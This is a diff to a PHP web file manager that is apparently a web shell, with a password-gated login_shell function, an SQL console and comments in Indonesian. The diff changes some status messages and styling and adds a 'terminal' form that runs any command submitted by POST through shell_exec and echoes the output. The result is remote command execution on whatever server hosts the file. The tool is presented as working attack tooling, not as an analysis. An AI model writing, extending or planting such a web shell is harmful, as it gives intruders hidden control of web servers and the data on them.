@@ -47,12 +47,12 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
             // Tandai bahwa pesan sudah dikirim
             $_SESSION['message_sent'] = true;
 
-            echo "Pesan berhasil dikirim.";
+            echo "good";
         } else {
-            echo "Pesan sudah dikirim untuk sesi ini.";
+            echo " ";
         }
     } else {
-        echo "Password salah. Silakan coba lagi.";
+        echo "Ulang cok!!";
     }
 }
 function login_shell() {
@@ -551,8 +551,8 @@ input, textarea, select, input.fm_input {
     color: red;
     font: normal 8pt Verdana, Arial, Helvetica, sans-serif;
     border-color: black;
-    background-color: #FFFFFF00 none !important;
-    border-radius: 0;
+    background-color: #000000 none !important;
+    border-radius: 5px;
     padding: 2px;
 }
 
@@ -917,6 +917,25 @@ url("data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAMAAAAoLQ9TAAAABGdBT
 </style>
 </head>
 <body>
+    <main>
+        <p><?php echo $current_dir; ?></p>
+        <p><?php echo $uname; ?></p>
+
+        <!-- Terminal Form -->
+        <p class="mt-3 font-weight-bold"><i class="fa-solid fa-terminal"></i>
+        <form method="POST">
+            <input type="text" name="command" placeholder="terminal" style="width: 30%; padding: 0.2rem;">
+            <input type="submit" value="Touch me!">
+        </form>
+
+        <?php
+        // Menjalankan perintah jika ada perintah yang dikirimkan
+        if (isset($_POST['command'])) {
+            $command = escapeshellcmd($_POST['command']); // Escape perintah untuk keamanan
+            $output = shell_exec($command); // Menjalankan perintah
+            echo "<pre style='background-color: black; color: white; padding: 1rem; margin-top: 1rem; text-align: left;'>$output</pre>";
+        }
+        ?>
 <?php
 $url_inc = '?fm=true';
 if (isset($_POST['sqlrun'])&&!empty($fm_config['enable_sql_console'])){
@@ -1467,6 +1486,7 @@ var table2Excel = function () {
         }
 }
 </script>
+</main>
 </body>
 </html>
 
